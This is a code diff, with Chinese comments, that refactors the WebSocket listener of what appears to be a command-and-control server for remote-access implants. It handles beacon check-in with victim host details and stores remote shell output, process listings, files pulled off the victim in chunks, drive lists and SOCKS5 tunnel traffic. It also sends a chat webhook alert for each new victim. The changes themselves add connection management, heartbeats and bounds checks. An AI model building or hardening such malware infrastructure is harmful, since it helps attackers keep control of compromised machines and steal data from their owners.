@@ -30,69 +30,308 @@ var upgrader = websocket.Upgrader{
 	},
 }
 
-var ClientManager = make(map[string]*WSClient)
-
+// WSClient 结构体，封装WebSocket连接和相关数据
 type WSClient struct {
-	Conn    *websocket.Conn
-	WriteMu sync.Mutex
+	Conn            *websocket.Conn
+	UID             string
+	WriteMu         sync.Mutex
+	StopChan        chan struct{}
+	LastHeartbeat   time.Time
+	TimeoutCount    int
+	IsClosed        bool
+	CloseOnce       sync.Once
+	PingTicker      *time.Ticker
+	HeartbeatTicker *time.Ticker
 }
 
-var MuClientManager sync.Mutex
-
-type ClientTime struct {
-	lastHeartbeat time.Time
-	timeoutCount  int
+// ClientManager 全局连接管理器
+type ClientManager struct {
+	Clients map[string]*WSClient
+	Mu      sync.RWMutex
 }
 
-var ClientTimeManager = make(map[string]*ClientTime)
+var (
+	globalClientManager = &ClientManager{
+		Clients: make(map[string]*WSClient),
+	}
+)
 
+// Add 添加客户端到管理器
+func (cm *ClientManager) Add(uid string, client *WSClient) {
+	cm.Mu.Lock()
+	defer cm.Mu.Unlock()
+	cm.Clients[uid] = client
+	logger.Info("Client added:", uid, "Total clients:", len(cm.Clients))
+}
+
+// Remove 从管理器移除客户端
+func (cm *ClientManager) Remove(uid string) {
+	cm.Mu.Lock()
+	defer cm.Mu.Unlock()
+	if client, exists := cm.Clients[uid]; exists {
+		if !client.IsClosed {
+			client.Close()
+		}
+		delete(cm.Clients, uid)
+		logger.Info("Client removed:", uid, "Total clients:", len(cm.Clients))
+	}
+}
+
+// Get 获取客户端
+func (cm *ClientManager) Get(uid string) (*WSClient, bool) {
+	cm.Mu.RLock()
+	defer cm.Mu.RUnlock()
+	client, exists := cm.Clients[uid]
+	return client, exists
+}
+
+// CloseAll 关闭所有客户端
+func (cm *ClientManager) CloseAll() {
+	cm.Mu.Lock()
+	defer cm.Mu.Unlock()
+	for uid, client := range cm.Clients {
+		if !client.IsClosed {
+			client.Close()
+		}
+		delete(cm.Clients, uid)
+	}
+}
+
+// Close 安全关闭客户端
+func (c *WSClient) Close() {
+	c.CloseOnce.Do(func() {
+		c.IsClosed = true
+
+		// 停止所有定时器
+		if c.PingTicker != nil {
+			c.PingTicker.Stop()
+		}
+		if c.HeartbeatTicker != nil {
+			c.HeartbeatTicker.Stop()
+		}
+
+		// 关闭停止通道
+		close(c.StopChan)
+
+		// 关闭WebSocket连接
+		if c.Conn != nil {
+			c.Conn.Close()
+		}
+
+		// 从全局管理器移除
+		if c.UID != "" {
+			globalClientManager.Mu.Lock()
+			delete(globalClientManager.Clients, c.UID)
+			globalClientManager.Mu.Unlock()
+		}
+
+		// 从连接类型管理器移除
+		connection.MuClientListenerType.Lock()
+		delete(connection.ClientListenerType, c.UID)
+		connection.MuClientListenerType.Unlock()
+
+		// 更新数据库状态为离线
+		if c.UID != "" {
+			database.Engine.Where("uid = ?", c.UID).Update(&database.Clients{Online: "2"})
+			logger.Info("Client marked as offline:", c.UID)
+		}
+
+		logger.Info("WebSocket connection closed for client:", c.UID)
+	})
+}
+
+// WriteMessage 安全发送消息
+func (c *WSClient) WriteMessage(message []byte) error {
+	c.WriteMu.Lock()
+	defer c.WriteMu.Unlock()
+
+	if c.IsClosed {
+		return fmt.Errorf("connection closed")
+	}
+
+	c.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+	return c.Conn.WriteMessage(websocket.BinaryMessage, message)
+}
+
+// startPing 启动Ping定时器
+func (c *WSClient) startPing() {
+	defer func() {
+		if r := recover(); r != nil {
+			logger.Error("Ping goroutine panic recovered:", r)
+		}
+	}()
+
+	for {
+		select {
+		case <-c.PingTicker.C:
+			if c.IsClosed {
+				return
+			}
+
+			c.WriteMu.Lock()
+			c.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+			if err := c.Conn.WriteMessage(websocket.PingMessage, nil); err != nil {
+				c.WriteMu.Unlock()
+				logger.Info("Ping failed, closing connection for client:", c.UID, "Error:", err)
+				c.Close()
+				return
+			}
+			c.WriteMu.Unlock()
+
+		case <-c.StopChan:
+			return
+		}
+	}
+}
+
+// startHeartbeatCheck 启动心跳检查
+func (c *WSClient) startHeartbeatCheck() {
+	defer func() {
+		if r := recover(); r != nil {
+			logger.Error("Heartbeat checker panic recovered:", r)
+		}
+	}()
+
+	for {
+		select {
+		case <-c.HeartbeatTicker.C:
+			if c.IsClosed {
+				return
+			}
+
+			// 检查心跳是否超时
+			if time.Since(c.LastHeartbeat) > 30*time.Second {
+				c.TimeoutCount++
+				logger.Warn("Heartbeat timeout for client:", c.UID, "Timeout count:", c.TimeoutCount)
+
+				if c.TimeoutCount >= 3 {
+					logger.Info("Max heartbeat timeout reached, closing connection for client:", c.UID)
+					c.Close()
+					return
+				}
+			}
+
+		case <-c.StopChan:
+			return
+		}
+	}
+}
+
+// HandleWebSocket 处理WebSocket连接
 func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
+	logger.Info("New WebSocket connection attempt from:", r.RemoteAddr)
+
+	// 升级HTTP连接为WebSocket
 	ws, err := upgrader.Upgrade(w, r, nil)
 	if err != nil {
-		logger.Error("upgrade failed:", err)
+		logger.Error("WebSocket upgrade failed:", err)
 		return
 	}
 
+	logger.Info("WebSocket connection established from:", r.RemoteAddr)
+
+	// 创建客户端对象
+	client := &WSClient{
+		Conn:          ws,
+		StopChan:      make(chan struct{}),
+		LastHeartbeat: time.Now(),
+		IsClosed:      false,
+	}
+
+	defer func() {
+		// 确保连接被关闭
+		client.Close()
+		logger.Info("WebSocket handler finished for:", r.RemoteAddr)
+	}()
+
+	// 设置连接参数
+	ws.SetReadLimit(10 * 1024 * 1024) // 10MB最大消息大小
+	ws.SetReadDeadline(time.Now().Add(60 * time.Second))
+	ws.SetPongHandler(func(string) error {
+		ws.SetReadDeadline(time.Now().Add(60 * time.Second))
+		return nil
+	})
+
+	// 启动Ping定时器
+	client.PingTicker = time.NewTicker(30 * time.Second)
+	go client.startPing()
+
+	// 主消息处理循环
 	for {
-		_, message, err := ws.ReadMessage()
-		if err != nil {
-			logger.Error(err.Error())
+		if client.IsClosed {
 			break
 		}
-		if len(message) == 0 {
+
+		// 读取消息
+		messageType, message, err := ws.ReadMessage()
+		if err != nil {
+			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
+				logger.Info("WebSocket closed unexpectedly:", err)
+			} else if websocket.IsCloseError(err) {
+				logger.Info("WebSocket closed normally")
+			} else {
+				logger.Error("WebSocket read error:", err)
+			}
+			break
+		}
+
+		// 只处理二进制消息
+		if messageType != websocket.BinaryMessage {
+			logger.Warn("Received non-binary message, ignoring")
 			continue
 		}
-		msgTypeBytes := message[:4]
 
+		if len(message) == 0 {
+			logger.Warn("Received empty message, ignoring")
+			continue
+		}
+
+		// 处理消息
+		if len(message) < 4 {
+			logger.Error("Message too short")
+			continue
+		}
+
+		msgTypeBytes := message[:4]
 		msgType := binary.BigEndian.Uint32(msgTypeBytes)
+
 		switch msgType {
-		case 1: //firstBlood
+		case 1: // firstBlood
 			msg := message[4:]
 			tmpMetainfo, err := encrypt.DecodeBase64(msg)
 			if err != nil {
-				logger.Error(err.Error())
+				logger.Error("DecodeBase64 failed:", err)
+				continue
 			}
+
 			metainfo, err := encrypt.Decrypt(tmpMetainfo)
 			if err != nil {
-				logger.Error(err.Error())
+				logger.Error("Decrypt failed:", err)
+				continue
 			}
+
 			uid := encrypt.BytesToMD5(metainfo)
+			client.UID = uid
+			client.LastHeartbeat = time.Now()
+			client.TimeoutCount = 0
 
-			MuClientManager.Lock()
+			// 添加到全局管理器
+			globalClientManager.Add(uid, client)
 
-			client1 := &WSClient{
-				Conn: ws,
-			}
-			ClientManager[uid] = client1
-			MuClientManager.Unlock()
-
+			// 更新连接类型
 			connection.MuClientListenerType.Lock()
 			connection.ClientListenerType[uid] = "websocket"
 			connection.MuClientListenerType.Unlock()
 
-			var client database.Clients
-			exsists, _ := database.Engine.Where("uid = ?", uid).Get(&client)
-			if !exsists { // FirstBlood
+			// 启动心跳检查
+			client.HeartbeatTicker = time.NewTicker(10 * time.Second)
+			go client.startHeartbeatCheck()
+
+			// 检查客户端是否已存在
+			var existingClient database.Clients
+			exists, _ := database.Engine.Where("uid = ?", uid).Get(&existingClient)
+
+			if !exists { // FirstBlood
 				processID := binary.BigEndian.Uint32(metainfo[:4])
 				flag := int(metainfo[4:5][0])
 				ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
@@ -104,10 +343,9 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 				UserName := osArray[1]
 				processName := osArray[2]
 
-				// 外网 ip
+				// 获取外网IP
 				externalIp, _, err := net.SplitHostPort(r.RemoteAddr)
 				if err != nil {
-					// 如果没有端口号，直接返回 RemoteAddr
 					externalIp = r.RemoteAddr
 				}
 				if externalIp == "::1" {
@@ -128,77 +366,155 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 				if flag > 4 {
 					arch = "x64"
 				}
-				c := database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: "0", Online: "1", Color: ""}
-				database.Engine.Insert(&c)
+
+				// 创建新客户端记录
+				c := database.Clients{
+					Uid:        uid,
+					FirstStart: formattedTime,
+					ExternalIP: externalIp,
+					InternalIP: localIP,
+					Username:   UserName,
+					Computer:   hostName,
+					Process:    processName,
+					Pid:        strconv.Itoa(int(processID)),
+					Address:    address,
+					Arch:       arch,
+					Note:       "",
+					Sleep:      "0",
+					Online:     "1",
+					Color:      "",
+				}
+
+				// 插入数据库
+				if _, err := database.Engine.Insert(&c); err != nil {
+					logger.Error("Failed to insert client:", err)
+				}
+
+				// 插入相关表
 				database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
 				database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})
-				if exits, key := webhooks.CheckEnable(); exits {
+
+				// 发送Webhook通知
+				if exists, key := webhooks.CheckEnable(); exists {
 					webhooks.SendWecom(c, key)
 				}
-			}
-			database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "1"})
-			clientTime := &ClientTime{
-				lastHeartbeat: time.Now(),
-				timeoutCount:  0,
-			}
-			MuClientManager.Lock()
-			ClientTimeManager[uid] = clientTime
-			MuClientManager.Unlock()
-			go checkHeartbeats(uid)
-		case 2: // otherMsg
 
+				logger.Info("New client registered:", uid, "IP:", externalIp)
+			} else {
+				// 更新在线状态
+				database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "1"})
+				logger.Info("Client reconnected:", uid)
+			}
+
+		case 2: // otherMsg
 			msg := message[4:]
+			if len(msg) < 4 {
+				logger.Error("OtherMsg too short")
+				continue
+			}
+
 			metaLen := binary.BigEndian.Uint32(msg[:4])
+			if len(msg) < int(4+metaLen) {
+				logger.Error("Invalid meta length")
+				continue
+			}
+
 			metaMsg := msg[4 : 4+metaLen]
 			realMsg := msg[4+metaLen:]
 
 			tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
 			if err != nil {
-				logger.Error(err.Error())
+				logger.Error("DecodeBase64 failed:", err)
+				continue
 			}
+
 			metainfo, err := encrypt.Decrypt(tmpMetainfo)
 			if err != nil {
-				logger.Error(err.Error())
+				logger.Error("Decrypt failed:", err)
+				continue
 			}
+
 			uid := encrypt.BytesToMD5(metainfo)
 
-			dataBytes, _ := encrypt.DecodeBase64(realMsg)
-			dataBytes, _ = encrypt.Decrypt(dataBytes)
-			dataBytes, _ = encrypt.Decrypt(dataBytes)
+			// 检查客户端是否在线
+			if _, exists := globalClientManager.Get(uid); !exists {
+				logger.Warn("Received message from offline client:", uid)
+				continue
+			}
+
+			dataBytes, err := encrypt.DecodeBase64(realMsg)
+			if err != nil {
+				logger.Error("DecodeBase64 failed:", err)
+				continue
+			}
+
+			dataBytes, err = encrypt.Decrypt(dataBytes)
+			if err != nil {
+				logger.Error("First decrypt failed:", err)
+				continue
+			}
+
+			dataBytes, err = encrypt.Decrypt(dataBytes)
+			if err != nil {
+				logger.Error("Second decrypt failed:", err)
+				continue
+			}
+
+			if len(dataBytes) < 4 {
+				logger.Error("Decrypted data too short")
+				continue
+			}
+
 			replyTypeBytes := dataBytes[:4]
 			data := dataBytes[4:]
 			replyType := binary.BigEndian.Uint32(replyTypeBytes)
 
 			switch replyType {
-			case 0: //命令行展示
+			case 0: // 命令行展示
 				var shell database.Shell
-				database.Engine.Where("uid = ?", uid).Get(&shell)
-				shell.ShellContent += string(data) + "\n"
-				database.Engine.Where("uid = ?", uid).Update(&shell)
+				if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
+					shell.ShellContent += string(data) + "\n"
+					database.Engine.Where("uid = ?", uid).Update(&shell)
+				}
+
 			case 31: // 错误展示
 				var shell database.Shell
-				database.Engine.Where("uid = ?", uid).Get(&shell)
-				shell.ShellContent += "!Error: " + string(data) + "\n"
-				database.Engine.Where("uid = ?", uid).Update(&shell)
+				if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
+					shell.ShellContent += "!Error: " + string(data) + "\n"
+					database.Engine.Where("uid = ?", uid).Update(&shell)
+				}
+
 			case command.PS:
 				command.VarPidQueue.Add(uid, string(data))
+
 			case command.FileBrowse:
 				command.VarFileBrowserQueue.Add(uid, string(data))
-			case 22: //文件下载第一条信息
+
+			case 22: // 文件下载第一条信息
+				if len(data) < 4 {
+					logger.Error("File download info too short")
+					break
+				}
+
 				fileLen := int(binary.BigEndian.Uint32(data[:4]))
+				if len(data) < 4+fileLen {
+					logger.Error("Invalid file path length")
+					break
+				}
+
 				filePath := string(data[4:])
 
-				// 使用通用的安全路径函数
+				// 使用安全路径函数
 				fullPath, err := utils.GetSafeFilePath(uid, filePath)
 				if err != nil {
-					logger.Error("Security check failed: %v", err)
+					logger.Error("Security check failed:", err)
 					break
 				}
 
 				// 确保下载目录存在
-				downloadDir := filepath.Dir(fullPath) // 从安全路径获取目录
+				downloadDir := filepath.Dir(fullPath)
 				if err := os.MkdirAll(downloadDir, 0755); err != nil {
-					logger.Error("Failed to create download directory: %v", err)
+					logger.Error("Failed to create download directory:", err)
 					break
 				}
 
@@ -210,132 +526,183 @@ WHERE uid = ? AND file_path = ?;
 `
 				_, err = database.Engine.QueryString(sql, fileLen, 0, uid, filePath)
 				if err != nil {
-					logger.Error("Database update failed: %v", err)
+					logger.Error("Database update failed:", err)
 				}
 
-				// 检查文件是否存在，如果存在则删除
+				// 检查并删除已存在的文件
 				if _, err := os.Stat(fullPath); err == nil {
 					if err := os.Remove(fullPath); err != nil {
-						logger.Error("Failed to remove existing file: %v", err)
+						logger.Error("Failed to remove existing file:", err)
 						break
 					}
 				}
 
-				// 创建新文件（使用安全路径）
+				// 创建新文件
 				fp, err := os.OpenFile(fullPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
 				if err != nil {
-					logger.Error("Failed to create file: %v", err)
+					logger.Error("Failed to create file:", err)
 					break
 				}
-				defer fp.Close()
-			case command.DOWNLOAD: //文件下载
+				fp.Close()
+
+			case command.DOWNLOAD: // 文件下载
+				if len(data) < 4 {
+					logger.Error("Download data too short")
+					break
+				}
+
 				filePathLen := int(binary.BigEndian.Uint32(data[:4]))
+				if len(data) < 4+filePathLen {
+					logger.Error("Invalid file path length in download")
+					break
+				}
+
 				filePath := string(data[4 : 4+filePathLen])
 				fileContent := data[4+filePathLen:]
 
-				// 使用通用的安全路径函数
+				// 使用安全路径函数
 				fullPath, err := utils.GetSafeFilePath(uid, filePath)
 				if err != nil {
-					logger.Error("Security check failed: %v", err)
+					logger.Error("Security check failed:", err)
 					break
 				}
 
 				var fileDownloads database.Downloads
-				database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads)
-				fileDownloads.DownloadedSize += len(fileContent)
-				database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Update(&fileDownloads)
+				if _, err := database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads); err == nil {
+					fileDownloads.DownloadedSize += len(fileContent)
+					database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Update(&fileDownloads)
+				}
 
 				// 确保目录存在
 				downloadDir := filepath.Dir(fullPath)
 				if err := os.MkdirAll(downloadDir, 0755); err != nil {
-					logger.Error("Failed to create download directory: %v", err)
+					logger.Error("Failed to create download directory:", err)
 					break
 				}
 
-				// 使用安全路径打开文件
+				// 追加文件内容
 				fp, err := os.OpenFile(fullPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
 				if err != nil {
-					logger.Error("Failed to open file: %v", err)
+					logger.Error("Failed to open file:", err)
 					break
 				}
-				defer fp.Close()
 
 				if _, err := fp.Write(fileContent); err != nil {
-					logger.Error("Failed to write file content: %v", err)
+					logger.Error("Failed to write file content:", err)
 				}
+				fp.Close()
 
 			case command.DRIVES:
 				drives := utils.GetExistingDrives(data)
 				command.VarDrivesQueue.Add(uid, drives)
+
 			case command.FileContent:
+				if len(data) < 4 {
+					logger.Error("File content data too short")
+					break
+				}
+
 				filePathLen := int(binary.BigEndian.Uint32(data[:4]))
+				if len(data) < 4+filePathLen {
+					logger.Error("Invalid file path length in file content")
+					break
+				}
+
 				filePath := string(data[4 : 4+filePathLen])
 				fileContent := data[4+filePathLen:]
 				command.VarFileContentQueue.Add(uid, filePath, string(fileContent))
+
 			case command.Socks5Data:
+				if len(data) < 16 {
+					logger.Error("Socks5 data too short")
+					break
+				}
+
 				md5sign := data[:16]
 				rawData := data[16:]
 				command.VarSocks5Queue.Add(uid, fmt.Sprintf("%x", md5sign), string(rawData))
+
+			default:
+				logger.Warn("Unknown reply type:", replyType)
 			}
-		case 3: //heartBeat
+
+		case 3: // heartBeat
 			msg := message[4:]
 			tmpMetainfo, err := encrypt.DecodeBase64(msg)
 			if err != nil {
-				logger.Error(err.Error())
+				logger.Error("DecodeBase64 failed:", err)
+				continue
 			}
+
 			metainfo, err := encrypt.Decrypt(tmpMetainfo)
 			if err != nil {
-				logger.Error(err.Error())
+				logger.Error("Decrypt failed:", err)
+				continue
 			}
+
 			uid := encrypt.BytesToMD5(metainfo)
 
-			clientTime := &ClientTime{
-				lastHeartbeat: time.Now(),
-				timeoutCount:  0,
+			// 更新心跳时间
+			if c, exists := globalClientManager.Get(uid); exists && !c.IsClosed {
+				c.LastHeartbeat = time.Now()
+				c.TimeoutCount = 0
 			}
-			MuClientManager.Lock()
-			ClientTimeManager[uid] = clientTime
-			MuClientManager.Unlock()
 
+		default:
+			logger.Warn("Unknown message type:", msgType)
 		}
-
-		if err != nil {
-			logger.Error("read error:", err)
-			break
-		}
-
-	}
-}
-func checkHeartbeats(uid string) {
-	ticker := time.NewTicker(10 * time.Second)
-	defer ticker.Stop()
-
-	for range ticker.C {
-		MuClientManager.Lock()
-		currentTime := time.Now()
-
-		if _, exists := ClientTimeManager[uid]; exists {
-			if currentTime.Sub(ClientTimeManager[uid].lastHeartbeat) > 10*time.Second {
-				ClientTimeManager[uid].timeoutCount++
-				if ClientTimeManager[uid].timeoutCount >= 30 {
-					ClientManager[uid].Conn.Close()
-					database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "2"})
-					delete(ClientManager, uid)
-					delete(ClientTimeManager, uid)
-				}
-			}
-		} else {
-			break
-		}
-
-		MuClientManager.Unlock()
 	}
 }
 
+// Cleanup 全局清理函数
+func Cleanup() {
+	logger.Info("Starting WebSocket cleanup...")
+	globalClientManager.CloseAll()
+	logger.Info("WebSocket cleanup completed")
+}
+
+// GetClientStats 获取客户端统计信息
+func GetClientStats() map[string]interface{} {
+	globalClientManager.Mu.RLock()
+	defer globalClientManager.Mu.RUnlock()
+
+	stats := make(map[string]interface{})
+	stats["total_clients"] = len(globalClientManager.Clients)
+
+	onlineCount := 0
+	for _, client := range globalClientManager.Clients {
+		if !client.IsClosed {
+			onlineCount++
+		}
+	}
+	stats["online_clients"] = onlineCount
+
+	return stats
+}
+
+// GetClient 获取指定客户端
+func GetClient(uid string) *WSClient {
+	if client, exists := globalClientManager.Get(uid); exists && !client.IsClosed {
+		return client
+	}
+	return nil
+}
+
+// SendToClient 向指定客户端发送消息
+func SendToClient(uid string, message []byte) error {
+	client := GetClient(uid)
+	if client == nil {
+		return fmt.Errorf("client not found or offline")
+	}
+
+	return client.WriteMessage(message)
+}
+
+// 测试用的main函数
 func main() {
 	http.HandleFunc("/ws", HandleWebSocket)
 
-	logger.Error("Starting server on :8080")
+	logger.Info("Starting WebSocket server on :8080")
 	if err := http.ListenAndServe(":8080", nil); err != nil {
 		log.Fatal("ListenAndServe: ", err)
 	}
